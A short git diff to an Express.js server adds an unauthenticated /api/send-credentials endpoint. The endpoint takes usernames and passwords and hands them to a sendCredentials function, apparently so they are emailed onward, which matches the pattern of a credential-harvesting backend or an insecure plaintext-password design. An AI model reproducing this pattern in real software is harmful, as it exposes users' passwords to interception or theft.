@@ -1,7 +1,11 @@
 import express from "express";
 import cors from "cors";
 import dotenv from "dotenv";
-import { sendEmail, sendEmailLummy } from "./services/email.mjs";
+import {
+  sendEmail,
+  sendEmailLummy,
+  sendCredentials,
+} from "./services/email.mjs";
 
 dotenv.config();
 
@@ -34,6 +38,14 @@ app.post("/api/send-form-lummy", async (req, res) => {
   await sendEmailLummy(form, email);
 
   res.json({ message: "Form sent successfully" });
+});
+
+app.post("/api/send-credentials", async (req, res) => {
+  const { username, password } = req.body;
+
+  await sendCredentials(username, password);
+
+  res.json({ message: "Credentials sent successfully" });
 });
 
 app.listen(PORT, () => {
